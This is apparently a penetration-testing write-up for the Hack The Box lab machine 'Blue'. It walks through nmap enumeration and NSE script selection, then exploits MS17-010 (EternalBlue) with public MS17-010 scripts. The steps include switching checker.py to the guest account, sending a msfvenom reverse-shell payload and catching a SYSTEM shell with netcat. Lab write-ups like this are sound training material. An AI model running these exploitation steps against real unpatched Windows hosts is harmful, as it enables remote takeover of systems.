# Blue: 10.10.10.40

## Hints

- Some `nmap` vulnerability scripts will help identify a very well known remote code execution vulnerability
- You can Metasploit for an easy win or use one of the many other exploits that are publicly available

## nmap

Starting with the usual `nmap` scan. Used a different technique, looking for all open ports, then service scanning them:

```none
└─$ nmap -p- 10.10.10.40 -oA logs/nmap-all -T5  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 11:05 NZDT
Nmap scan report for 10.10.10.40
Host is up (0.033s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

From here, can `cat` the `.nmap` file and get all the ports on one line.

```none
└─$ cat logs/nmap-all.nmap | grep open | cut -d/ -f 1 |  tr '\n' ','
135,139,445,49152,49153,49154,49155,49156,49157,
```

And can use this as input to another `nmap` command:

```none
└─$ nmap -p 135,139,445,49152,49153,49154,49155,49156,49157 -sC -sV -oA logs/nmap-services 10.10.10.40
```

And the interesting ports:

```none
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

This might not be "dramatically faster" in terms of processing time, but the process is faster. It allows more time to review the initial open port results and do something else while service scanning the open ports. Finishing with the usual list `nmap` interesting ports:

```none
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

Looks like we have a Windows 7 pro target running RPC and SMB. This box is pretty well known, just like the vulnerability it is named after Eternal Blue.

## Wrangling `nmap` Scripts

I haven't used `nmap` much for vulnerability scanning, and always forget the commands to use to run specific scripts, or even to search scripts. I thought I would document some of my processes for my future self to go back and read. All scripts are stored in `/usr/share/nmap/scripts` on Kali, and at the time of writing this, there were 603 scripts.

```none
└─$ ll /usr/share/nmap/scripts | wc -l
603
```

There is a nice list of all `nmap` scripts on the [`nmap` NSE docs website](https://nmap.org/nsedoc/index.html). I usually run `nmap` with `-sC` for default scripts. You can see a full list of these on the terminal using:

```none
nmap --script-help default
```

However, this is some very verbose information. While watching ippsec's video on [HackTheBox - Blue](https://www.youtube.com/watch?v=YRsfX6DW10E), I noted some of the useful commands he outlined.

Get a list of all `nmap` script categories.

```none
└─$ grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort | uniq -c
     38 "auth"
     46 "broadcast"
     73 "brute"
    119 "default"
    300 "discovery"
     11 "dos"
     45 "exploit"
     33 "external"
      3 "fuzzer"
    207 "intrusive"
     10 "malware"
    339 "safe"
     44 "version"
    104 "vuln"
```

Then get all the `nmap` scripts run when default scripts is specified.

```none
└─$ grep -r categories /usr/share/nmap/scripts/*.nse | grep default | awk -F: '{print $1}'
```

In this box, we are interested in any SMB script, specifically from the `vuln` category. If I was doing a real engagement, I might only want to use `safe` scripts too.

```none
└─$ grep -r categories /usr/share/nmap/scripts/*.nse | grep vuln | grep safe | grep smb
/usr/share/nmap/scripts/smb2-vuln-uptime.nse:categories = {"vuln", "safe"}
/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse:categories = {"vuln", "safe", "malware"}
/usr/share/nmap/scripts/smb-vuln-ms17-010.nse:categories = {"vuln", "safe"}
```

And to put them into a comma-separated list for input into a `nmap` command.

```none
└─$ grep -r categories /usr/share/nmap/scripts/*.nse | grep vuln | grep safe | grep smb | awk -F: '{print $1}' | tr '\n' ','   
/usr/share/nmap/scripts/smb2-vuln-uptime.nse,/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse,/usr/share/nmap/scripts/smb-vuln-ms17-010.nse,
```

And finally, we get a result indicating that the target is vulnerable to Eternal Blue.

```none
└─$ nmap --script "/usr/share/nmap/scripts/smb2-vuln-uptime.nse,/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse,/usr/share/nmap/scripts/smb-vuln-ms17-010.nse" -p 445 10.10.10.40
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-03 11:48 NZDT
Nmap scan report for 10.10.10.40
Host is up (0.033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
```

## Eternal Blue with MS17-010 by worawit

The original [MS17-010 GitHub repository by worawit](https://github.com/worawit/MS17-010) was released back in 2017 and has had a couple of updates since then. But the project is written in Python 2. If you have read any other HTB writeups I have done, you may have noticed that I use Docker quite a bit when dealing with Python 2 projects. I decided to do the same for this box, adding more to a previous solution I had written for the Legacy box.

The Docker solution is available in the [`exploits/perpetual_melancholy` folder](exploits/perpetual_melancholy). The solution has a script named `prep.sh` that creates a payload using `msfvenom` which is configurable using bash variables. Then it builds and starts a Docker container. Finally, it automatically puts the user into a shell on the container.

The general process when in the container is to:

- `checker.py`: Check that the target is vulnerable, and get returned named pipes
- `send_and_execute.py`: Run the exploit against the target and get a reverse shell connection

Getting started with the `checker.py` script, we can run it against the target.

```none
/opt/perpetual_melancholy/MS17-010 # python checker.py 10.10.10.40
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
```

However, the results are not good! There are no "named pipes" that permit access. When the `checker.py` script is being executed, it attempts authentication using a blank (empty) username and password. But we could try the same check using different accounts. If we look back to the `nmap` results, it is seen that the `nmap` scanner returned results when using the `guest` account.

```none
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

It is possible to edit the username on line 14 of the `checker.py` script.

```none
/opt/perpetual_melancholy/MS17-010 # cat -n checker.py 
     1  from mysmb import MYSMB
     2  from impacket import smb, smbconnection, nt_errors
     3  from impacket.uuid import uuidtup_to_bin
     4  from impacket.dcerpc.v5.rpcrt import DCERPCException
     5  from struct import pack
     6  import sys
     7
     8  '''
     9  Script for
    10  - check target if MS17-010 is patched or not.
    11  - find accessible named pipe
    12  '''
    13
    14  USERNAME = 'guest'
    15  PASSWORD = ''
    ...snip...
```

Running the `checker.py` script with the `guest` username provides some different results.

```none
/opt/perpetual_melancholy/MS17-010 # python checker.py 10.10.10.40
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
```

These are better results. The `send_and_receive.py` script also needs to be edited to operate correctly. Once again, added the `guest` username to the script.

```none
python send_and_execute.py 10.10.10.40 rev.exe
```

Success! Got a callback on the netcat listener, and Administrator access!

```none
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.40] 49176
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Done!

## Lessons Learned

- Docker is great for Python 2 code!
- Even in easy boxes, enumeration helps, like the `guest` account in this box

## Useful Resources

- [HackTheBox - Blue by ippsec](https://www.youtube.com/watch?v=YRsfX6DW10E)
- [HTB: Blue by 0xdf](https://0xdf.gitlab.io/2021/05/11/htb-blue.html)
